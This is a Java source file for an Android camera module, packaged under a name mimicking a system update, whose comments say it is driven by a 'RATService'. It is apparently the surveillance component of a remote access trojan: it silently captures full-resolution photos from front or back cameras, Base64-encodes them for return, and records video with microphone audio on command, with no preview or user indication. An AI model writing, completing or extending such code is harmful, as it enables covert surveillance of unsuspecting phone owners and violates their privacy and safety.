package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.core.app.ActivityCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class CameraModule {
    private static final String TAG = "CameraModule";

    // ── Tuning constants ────────────────────────────────────────────────────
    private static final int CAPTURE_TIMEOUT_SECONDS  = 15;   // was 5 — gives time for AF/AE
    private static final int MAX_RETRY_ATTEMPTS        = 3;
    private static final int JPEG_QUALITY_HIGH         = 97;   // was 95 — near-lossless
    private static final int JPEG_QUALITY_TEST         = 80;
    private static final int TEST_IMAGE_WIDTH          = 640;
    private static final int TEST_IMAGE_HEIGHT         = 480;

    // ── Video recording constants ────────────────────────────────────────────
    private static final int VIDEO_WIDTH    = 1280;
    private static final int VIDEO_HEIGHT   = 720;
    private static final int VIDEO_FPS      = 30;
    private static final int VIDEO_BITRATE  = 4_000_000; // 4 Mbps

    private final Context       context;
    private final CameraManager cameraManager;
    private String  currentCameraId;
    private String  backCameraId;
    private String  frontCameraId;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private boolean isUsingFrontCamera = false;

    // ── Shared camera resources ──────────────────────────────────────────────
    private ImageReader          imageReader;
    private CameraDevice         cameraDevice;
    private CameraCaptureSession captureSession;

    // ── Video recording resources ────────────────────────────────────────────
    private MediaRecorder mediaRecorder;
    private CameraDevice  videoCameraDevice;
    private CameraCaptureSession videoCaptureSession;
    private boolean isRecording = false;
    private String  currentRecordingPath = null;

    // ── Callback interface for recording completion ──────────────────────────
    public interface RecordingCallback {
        void onRecordingSaved(String filePath, long fileSizeBytes);
        void onRecordingError(String error);
    }
    private RecordingCallback recordingCallback;

    // ════════════════════════════════════════════════════════════════════════
    // Constructor
    // ════════════════════════════════════════════════════════════════════════
    public CameraModule(Context context) {
        this.context       = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        startBackgroundThread();
        findCameras();
        Log.d(TAG, "CameraModule initialised. back=" + backCameraId + " front=" + frontCameraId);
    }

    // ════════════════════════════════════════════════════════════════════════
    // Background thread
    // ════════════════════════════════════════════════════════════════════════
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try { backgroundThread.join(); } catch (InterruptedException ignored) {}
            backgroundThread = null;
            backgroundHandler = null;
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    // Camera discovery
    // ════════════════════════════════════════════════════════════════════════
    private void findCameras() {
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics c = cameraManager.getCameraCharacteristics(id);
                Integer facing = c.get(CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;
                if (facing == CameraCharacteristics.LENS_FACING_BACK)  backCameraId  = id;
                if (facing == CameraCharacteristics.LENS_FACING_FRONT) frontCameraId = id;
            }
        } catch (Exception e) {
            Log.e(TAG, "findCameras error", e);
        }
        currentCameraId  = backCameraId  != null ? backCameraId  :
                           frontCameraId != null ? frontCameraId : null;
        isUsingFrontCamera = (currentCameraId != null && currentCameraId.equals(frontCameraId));
    }

    // ════════════════════════════════════════════════════════════════════════
    // Camera switch
    // ════════════════════════════════════════════════════════════════════════
    public String switchCamera() {
        closeCamera();
        if (isUsingFrontCamera) {
            if (backCameraId == null) return "ERROR: No back camera";
            currentCameraId = backCameraId;
            isUsingFrontCamera = false;
            return "SUCCESS: Switched to back camera";
        } else {
            if (frontCameraId == null) return "ERROR: No front camera";
            currentCameraId = frontCameraId;
            isUsingFrontCamera = true;
            return "SUCCESS: Switched to front camera";
        }
    }

    public String getCurrentCamera() { return isUsingFrontCamera ? "front" : "back"; }

    // ════════════════════════════════════════════════════════════════════════
    // Resource cleanup
    // ════════════════════════════════════════════════════════════════════════
    private void closeCamera() {
        try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
        try { if (cameraDevice   != null) { cameraDevice.close();   cameraDevice   = null; } } catch (Exception ignored) {}
        try { if (imageReader    != null) { imageReader.close();    imageReader    = null; } } catch (Exception ignored) {}
    }

    private void closeVideoCamera() {
        try { if (videoCaptureSession != null) { videoCaptureSession.close(); videoCaptureSession = null; } } catch (Exception ignored) {}
        try { if (videoCameraDevice   != null) { videoCameraDevice.close();   videoCameraDevice   = null; } } catch (Exception ignored) {}
        try { if (mediaRecorder       != null) { mediaRecorder.release();     mediaRecorder       = null; } } catch (Exception ignored) {}
    }

    // ════════════════════════════════════════════════════════════════════════
    // Permission helpers
    // ════════════════════════════════════════════════════════════════════════
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }

    private boolean checkMicPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                == PackageManager.PERMISSION_GRANTED;
    }

    // ════════════════════════════════════════════════════════════════════════
    // Size selection helpers
    // ════════════════════════════════════════════════════════════════════════

    /**
     * Returns the largest JPEG output size for the current camera.
     * This gives full-resolution photos.
     */
    private Size getBestPhotoSize() {
        try {
            StreamConfigurationMap map = cameraManager
                    .getCameraCharacteristics(currentCameraId)
                    .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) return new Size(4032, 3024);

            Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) return new Size(4032, 3024);

            // Sort descending by total pixels → pick the largest
            return Collections.max(Arrays.asList(sizes),
                    Comparator.comparingInt(s -> s.getWidth() * s.getHeight()));
        } catch (Exception e) {
            Log.e(TAG, "getBestPhotoSize error", e);
            return new Size(4032, 3024);
        }
    }

    /** Returns the smallest JPEG size — used for the lightweight test capture. */
    private Size getSmallestSize() {
        try {
            StreamConfigurationMap map = cameraManager
                    .getCameraCharacteristics(currentCameraId)
                    .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) return new Size(TEST_IMAGE_WIDTH, TEST_IMAGE_HEIGHT);

            Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) return new Size(TEST_IMAGE_WIDTH, TEST_IMAGE_HEIGHT);

            return Collections.min(Arrays.asList(sizes),
                    Comparator.comparingInt(s -> s.getWidth() * s.getHeight()));
        } catch (Exception e) {
            return new Size(TEST_IMAGE_WIDTH, TEST_IMAGE_HEIGHT);
        }
    }

    /** Picks the closest supported video size to our target. */
    private Size getBestVideoSize() {
        try {
            StreamConfigurationMap map = cameraManager
                    .getCameraCharacteristics(currentCameraId)
                    .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) return new Size(VIDEO_WIDTH, VIDEO_HEIGHT);

            Size[] sizes = map.getOutputSizes(MediaRecorder.class);
            if (sizes == null || sizes.length == 0) return new Size(VIDEO_WIDTH, VIDEO_HEIGHT);

            // Pick the largest size that is ≤ 1920×1080 (avoid huge 4K video files)
            Size best = new Size(320, 240);
            for (Size s : sizes) {
                if (s.getWidth() <= 1920 && s.getHeight() <= 1080) {
                    if (s.getWidth() * s.getHeight() > best.getWidth() * best.getHeight()) {
                        best = s;
                    }
                }
            }
            Log.d(TAG, "Best video size: " + best.getWidth() + "x" + best.getHeight());
            return best;
        } catch (Exception e) {
            return new Size(VIDEO_WIDTH, VIDEO_HEIGHT);
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    // FIX 1 — takePhoto()  (highest quality)
    // ════════════════════════════════════════════════════════════════════════
    public String takePhoto() {
        Log.d(TAG, "takePhoto() camera=" + currentCameraId + " front=" + isUsingFrontCamera);

        if (!checkPermission())    return "ERROR: No camera permission";
        if (currentCameraId == null) return "ERROR: No camera available";

        closeCamera(); // ensure clean state

        for (int attempt = 0; attempt < MAX_RETRY_ATTEMPTS; attempt++) {
            Log.d(TAG, "takePhoto attempt " + (attempt + 1));

            final CountDownLatch        latch  = new CountDownLatch(1);
            final AtomicReference<byte[]> imgBytes = new AtomicReference<>();
            final AtomicReference<String> error    = new AtomicReference<>();

            try {
                // ── 1. Pick the BEST (largest) size ───────────────────────────
                Size photoSize = getBestPhotoSize();
                Log.d(TAG, "Photo size selected: " + photoSize.getWidth() + "x" + photoSize.getHeight());

                // ── 2. Create ImageReader ─────────────────────────────────────
                imageReader = ImageReader.newInstance(
                        photoSize.getWidth(), photoSize.getHeight(), ImageFormat.JPEG, 2);

                imageReader.setOnImageAvailableListener(reader -> {
                    try (Image img = reader.acquireLatestImage()) {
                        if (img == null) { error.set("Image null"); latch.countDown(); return; }
                        ByteBuffer buf = img.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buf.remaining()];
                        buf.get(bytes);
                        imgBytes.set(bytes);
                        Log.d(TAG, "Image bytes received: " + bytes.length);
                    } catch (Exception e) {
                        error.set(e.getMessage());
                    } finally {
                        latch.countDown();
                    }
                }, backgroundHandler);

                // ── 3. Open camera ────────────────────────────────────────────
                cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice device) {
                        cameraDevice = device;
                        try {
                            device.createCaptureSession(
                                    Collections.singletonList(imageReader.getSurface()),
                                    new CameraCaptureSession.StateCallback() {
                                        @Override
                                        public void onConfigured(CameraCaptureSession session) {
                                            captureSession = session;
                                            try {
                                                CaptureRequest.Builder builder =
                                                        device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                                builder.addTarget(imageReader.getSurface());

                                                // ── Quality settings ─────────
                                                builder.set(CaptureRequest.JPEG_QUALITY, (byte) JPEG_QUALITY_HIGH);

                                                // Auto-focus (continuous picture = sharpest result)
                                                builder.set(CaptureRequest.CONTROL_AF_MODE,
                                                        CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);

                                                // Auto-exposure
                                                builder.set(CaptureRequest.CONTROL_AE_MODE,
                                                        CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);

                                                // Noise reduction — HIGH_QUALITY
                                                builder.set(CaptureRequest.NOISE_REDUCTION_MODE,
                                                        CaptureRequest.NOISE_REDUCTION_MODE_HIGH_QUALITY);

                                                // Edge enhancement — HIGH_QUALITY
                                                builder.set(CaptureRequest.EDGE_MODE,
                                                        CaptureRequest.EDGE_MODE_HIGH_QUALITY);

                                                // Colour correction
                                                builder.set(CaptureRequest.COLOR_CORRECTION_MODE,
                                                        CaptureRequest.COLOR_CORRECTION_MODE_HIGH_QUALITY);

                                                // Sharpening / tone-mapping
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    builder.set(CaptureRequest.TONEMAP_MODE,
                                                            CaptureRequest.TONEMAP_MODE_HIGH_QUALITY);
                                                }

                                                // Lock AE/AWB for a consistent single shot
                                                builder.set(CaptureRequest.CONTROL_AE_LOCK, false);
                                                builder.set(CaptureRequest.CONTROL_AWB_LOCK, false);

                                                session.capture(builder.build(), null, backgroundHandler);
                                            } catch (Exception e) {
                                                error.set(e.getMessage());
                                                latch.countDown();
                                                closeCamera();
                                            }
                                        }

                                        @Override
                                        public void onConfigureFailed(CameraCaptureSession s) {
                                            error.set("Session configure failed");
                                            latch.countDown();
                                            closeCamera();
                                        }
                                    }, backgroundHandler);
                        } catch (Exception e) {
                            error.set(e.getMessage());
                            latch.countDown();
                            closeCamera();
                        }
                    }

                    @Override public void onDisconnected(CameraDevice d) {
                        d.close(); error.set("Camera disconnected"); latch.countDown();
                    }
                    @Override public void onError(CameraDevice d, int err) {
                        d.close(); error.set("Camera error: " + err); latch.countDown();
                    }
                }, backgroundHandler);

                // ── 4. Wait ───────────────────────────────────────────────────
                boolean ok = latch.await(CAPTURE_TIMEOUT_SECONDS, TimeUnit.SECONDS);
                closeCamera();

                if (!ok) {
                    Log.w(TAG, "Capture timeout on attempt " + (attempt + 1));
                    if (attempt < MAX_RETRY_ATTEMPTS - 1) { Thread.sleep(400); continue; }
                    return "ERROR: Capture timeout";
                }

                if (error.get() != null) {
                    Log.w(TAG, "Capture error on attempt " + (attempt + 1) + ": " + error.get());
                    if (attempt < MAX_RETRY_ATTEMPTS - 1) { Thread.sleep(400); continue; }
                    return "ERROR: " + error.get();
                }

                byte[] bytes = imgBytes.get();
                if (bytes == null || bytes.length == 0) {
                    if (attempt < MAX_RETRY_ATTEMPTS - 1) { Thread.sleep(400); continue; }
                    return "ERROR: Empty image";
                }

                Log.d(TAG, "takePhoto() success: " + bytes.length + " bytes (" +
                        photoSize.getWidth() + "x" + photoSize.getHeight() + ")");
                return Base64.encodeToString(bytes, Base64.NO_WRAP);

            } catch (Exception e) {
                Log.e(TAG, "takePhoto attempt " + (attempt + 1) + " exception", e);
                closeCamera();
                if (attempt < MAX_RETRY_ATTEMPTS - 1) {
                    try { Thread.sleep(400); } catch (InterruptedException ignored) {}
                } else {
                    return "ERROR: " + e.getMessage();
                }
            }
        }
        return "ERROR: All capture attempts failed";
    }

    // ════════════════════════════════════════════════════════════════════════
    // FIX 2 — Video recording (startRecording / stopRecording)
    //
    // Protocol called from RATService:
    //   startRecording(outputFilePath)  →  "SUCCESS:..." | "ERROR:..."
    //   stopRecording()                 →  calls recordingCallback when file ready
    // ════════════════════════════════════════════════════════════════════════

    public void setRecordingCallback(RecordingCallback cb) {
        this.recordingCallback = cb;
    }

    /**
     * Start recording video to |outputPath|.
     * Returns "SUCCESS: Recording started" or "ERROR: …"
     */
    public String startRecording(String outputPath) {
        Log.d(TAG, "startRecording() path=" + outputPath);

        if (!checkPermission())    return "ERROR: No camera permission";
        if (!checkMicPermission()) return "ERROR: No microphone permission";
        if (currentCameraId == null) return "ERROR: No camera available";
        if (isRecording)           return "ERROR: Already recording";

        closeVideoCamera(); // clean slate

        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicReference<String> result = new AtomicReference<>("ERROR: Unknown");

        try {
            Size videoSize = getBestVideoSize();
            currentRecordingPath = outputPath;

            // ── Configure MediaRecorder ─────────────────────────────────────
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                mediaRecorder = new MediaRecorder(context);
            } else {
                //noinspection deprecation
                mediaRecorder = new MediaRecorder();
            }

            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setOutputFile(outputPath);
            mediaRecorder.setVideoEncodingBitRate(VIDEO_BITRATE);
            mediaRecorder.setVideoFrameRate(VIDEO_FPS);
            mediaRecorder.setVideoSize(videoSize.getWidth(), videoSize.getHeight());
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioEncodingBitRate(128_000);
            mediaRecorder.setAudioSamplingRate(44100);
            mediaRecorder.prepare();

            Surface recorderSurface = mediaRecorder.getSurface();

            // ── Open camera for video ───────────────────────────────────────
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    videoCameraDevice = device;
                    try {
                        List<Surface> surfaces = Collections.singletonList(recorderSurface);

                        device.createCaptureSession(surfaces,
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession session) {
                                        videoCaptureSession = session;
                                        try {
                                            CaptureRequest.Builder builder =
                                                    device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                                            builder.addTarget(recorderSurface);
                                            builder.set(CaptureRequest.CONTROL_MODE,
                                                    CaptureRequest.CONTROL_MODE_AUTO);
                                            builder.set(CaptureRequest.CONTROL_AF_MODE,
                                                    CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
                                            builder.set(CaptureRequest.CONTROL_AE_MODE,
                                                    CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);

                                            session.setRepeatingRequest(
                                                    builder.build(), null, backgroundHandler);

                                            mediaRecorder.start();
                                            isRecording = true;
                                            result.set("SUCCESS: Recording started → " + outputPath);
                                            latch.countDown();
                                        } catch (Exception e) {
                                            result.set("ERROR: " + e.getMessage());
                                            latch.countDown();
                                            closeVideoCamera();
                                        }
                                    }

                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession s) {
                                        result.set("ERROR: Session configure failed");
                                        latch.countDown();
                                        closeVideoCamera();
                                    }
                                }, backgroundHandler);
                    } catch (Exception e) {
                        result.set("ERROR: " + e.getMessage());
                        latch.countDown();
                        closeVideoCamera();
                    }
                }

                @Override public void onDisconnected(CameraDevice d) {
                    d.close(); result.set("ERROR: Camera disconnected"); latch.countDown();
                }
                @Override public void onError(CameraDevice d, int err) {
                    d.close(); result.set("ERROR: Camera error " + err); latch.countDown();
                }
            }, backgroundHandler);

            latch.await(10, TimeUnit.SECONDS);
            return result.get();

        } catch (Exception e) {
            Log.e(TAG, "startRecording exception", e);
            closeVideoCamera();
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Stop recording, finalize the MP4 file, then fire the callback with the file path.
     * Returns "SUCCESS" or "ERROR: …"
     */
    public String stopRecording() {
        Log.d(TAG, "stopRecording() recording=" + isRecording);

        if (!isRecording) return "ERROR: Not recording";

        String savedPath = currentRecordingPath;
        isRecording = false;

        try {
            if (videoCaptureSession != null) {
                videoCaptureSession.stopRepeating();
            }
        } catch (Exception ignored) {}

        try {
            mediaRecorder.stop();
            mediaRecorder.reset();
        } catch (Exception e) {
            Log.e(TAG, "MediaRecorder stop error", e);
            closeVideoCamera();
            currentRecordingPath = null;
            if (recordingCallback != null) recordingCallback.onRecordingError("Stop failed: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }

        closeVideoCamera();
        currentRecordingPath = null;

        // Verify the file was written
        if (savedPath != null) {
            File f = new File(savedPath);
            if (f.exists() && f.length() > 0) {
                Log.d(TAG, "Video saved: " + savedPath + " (" + f.length() + " bytes)");
                if (recordingCallback != null) {
                    recordingCallback.onRecordingSaved(savedPath, f.length());
                }
                return "SUCCESS: " + savedPath;
            } else {
                if (recordingCallback != null) recordingCallback.onRecordingError("File empty or missing");
                return "ERROR: File not created";
            }
        }

        return "SUCCESS";
    }

    public boolean isRecording() { return isRecording; }

    // ════════════════════════════════════════════════════════════════════════
    // Test / diagnostic methods (unchanged logic, minor cleanup)
    // ════════════════════════════════════════════════════════════════════════

    public String captureTestImage() {
        if (!checkPermission())    return "ERROR: No camera permission";
        if (currentCameraId == null) return "ERROR: No camera available";
        closeCamera();

        final AtomicReference<String> result = new AtomicReference<>("ERROR");
        final CountDownLatch latch = new CountDownLatch(1);

        try {
            Size testSize = getSmallestSize();
            imageReader = ImageReader.newInstance(testSize.getWidth(), testSize.getHeight(),
                    ImageFormat.JPEG, 2);

            imageReader.setOnImageAvailableListener(reader -> {
                try (Image img = reader.acquireLatestImage()) {
                    if (img == null) { result.set("ERROR: null image"); latch.countDown(); return; }
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    result.set("SUCCESS:" + bytes.length + ":" + Base64.encodeToString(bytes, Base64.NO_WRAP));
                } catch (Exception e) {
                    result.set("ERROR: " + e.getMessage());
                } finally {
                    latch.countDown();
                }
            }, backgroundHandler);

            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice device) {
                    cameraDevice = device;
                    try {
                        device.createCaptureSession(
                                Collections.singletonList(imageReader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession s) {
                                        captureSession = s;
                                        try {
                                            CaptureRequest.Builder b =
                                                    device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                            b.addTarget(imageReader.getSurface());
                                            b.set(CaptureRequest.JPEG_QUALITY, (byte) JPEG_QUALITY_TEST);
                                            b.set(CaptureRequest.CONTROL_AF_MODE,
                                                    CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                            s.capture(b.build(), null, backgroundHandler);
                                        } catch (Exception e) { result.set("ERROR: " + e.getMessage()); latch.countDown(); closeCamera(); }
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession s) {
                                        result.set("ERROR: configure failed"); latch.countDown(); closeCamera();
                                    }
                                }, backgroundHandler);
                    } catch (Exception e) { result.set("ERROR: " + e.getMessage()); latch.countDown(); closeCamera(); }
                }
                @Override public void onDisconnected(CameraDevice d) { d.close(); result.set("ERROR: disconnected"); latch.countDown(); }
                @Override public void onError(CameraDevice d, int err) { d.close(); result.set("ERROR: " + err); latch.countDown(); }
            }, backgroundHandler);

            return latch.await(8, TimeUnit.SECONDS) ? result.get() : "ERROR: Test timeout";
        } catch (Exception e) {
            closeCamera();
            return "ERROR: " + e.getMessage();
        } finally {
            closeCamera();
        }
    }

    public String testCamera() {
        if (!checkPermission()) return "ERROR: No camera permission";
        if (currentCameraId == null) return "ERROR: No camera selected";
        try {
            CameraCharacteristics c = cameraManager.getCameraCharacteristics(currentCameraId);
            Integer facing = c.get(CameraCharacteristics.LENS_FACING);
            String f = facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK"
                     : facing == CameraCharacteristics.LENS_FACING_FRONT ? "FRONT" : "OTHER";
            Size best = getBestPhotoSize();
            return "SUCCESS: Camera " + currentCameraId + " (" + f + ") max=" + best.getWidth() + "x" + best.getHeight();
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String testCamera2() {
        if (!checkPermission()) return "ERROR: No camera permission";
        try {
            StringBuilder sb = new StringBuilder("Camera report:\n");
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics c = cameraManager.getCameraCharacteristics(id);
                Integer facing = c.get(CameraCharacteristics.LENS_FACING);
                String f = facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK"
                         : facing == CameraCharacteristics.LENS_FACING_FRONT ? "FRONT" : "OTHER";
                sb.append("Camera ").append(id).append(" (").append(f).append(")\n");
                StreamConfigurationMap map = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                if (map != null) {
                    Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
                    if (sizes != null && sizes.length > 0) {
                        Size max = Collections.max(Arrays.asList(sizes),
                                Comparator.comparingInt(s -> s.getWidth() * s.getHeight()));
                        sb.append("  Max JPEG: ").append(max).append("\n");
                        sb.append("  Total sizes: ").append(sizes.length).append("\n");
                    }
                }
            }
            return "SUCCESS: " + sb;
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String testCapture() {
        if (!checkPermission()) return "ERROR: No camera permission";
        try {
            CountDownLatch latch = new CountDownLatch(1);
            AtomicReference<String> result = new AtomicReference<>("Failed");
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice d) { d.close(); result.set("SUCCESS"); latch.countDown(); }
                @Override public void onDisconnected(CameraDevice d) { d.close(); result.set("ERROR: Disconnected"); latch.countDown(); }
                @Override public void onError(CameraDevice d, int e) { d.close(); result.set("ERROR: " + e); latch.countDown(); }
            }, backgroundHandler);
            return latch.await(5, TimeUnit.SECONDS) ? result.get() : "ERROR: Timeout";
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    public String checkCameraStatus() {
        try {
            StringBuilder sb = new StringBuilder();
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics c = cameraManager.getCameraCharacteristics(id);
                Integer facing = c.get(CameraCharacteristics.LENS_FACING);
                String f = facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK"
                         : facing == CameraCharacteristics.LENS_FACING_FRONT ? "FRONT" : "OTHER";
                sb.append("Camera ").append(id).append(" (").append(f).append(")");
                if (id.equals(currentCameraId)) sb.append(" [CURRENT]");
                sb.append("\n");
            }
            return "SUCCESS: " + sb;
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    // ════════════════════════════════════════════════════════════════════════
    // Cleanup
    // ════════════════════════════════════════════════════════════════════════
    public void cleanup() {
        closeCamera();
        closeVideoCamera();
        stopBackgroundThread();
    }
}
